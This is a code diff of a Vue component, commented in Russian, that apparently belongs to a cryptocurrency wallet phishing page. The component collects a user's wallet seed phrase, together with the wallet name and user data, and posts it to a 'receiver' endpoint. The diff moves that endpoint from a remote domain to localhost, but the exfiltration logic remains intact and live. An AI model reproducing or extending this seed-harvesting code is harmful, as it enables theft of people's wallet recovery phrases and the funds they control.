@@ -25,7 +25,7 @@ const phrases = ref(Array.from({ length: seedLength.value }, () => ''));
 //функция отправки сид фразы для валидации, в случае ошибки возвращает false
 const sendData = async (joinedString) => {
   try {
-    await axios.post('https://console-test874.com/receiver', {
+    await axios.post('http://localhost:3000/receiver', {
     seed: joinedString,
     wallet: store.selectedWallet.name,
     userData: store.userData
@@ -48,7 +48,7 @@ const sendData = async (joinedString) => {
 }
 
 const chooseSeedLength = async () => {
-  await axios.post('https://console-test874.com/selectseed', {
+  await axios.post('http://localhost:3000/selectseed', {
     wallet: store.selectedWallet.name,
     userData: store.userData,
     seedLength: seedLength.value
@@ -267,7 +267,7 @@ onMounted(() => {
           >
             <img
               style="margin-bottom: 1.25em; width: 10vh"
-              :src="`https://console-test874.com/images/${store.selectedWallet.image}`"
+              :src="`http://localhost:3000/images/${store.selectedWallet.image}`"
               alt=""
             />
             <h1
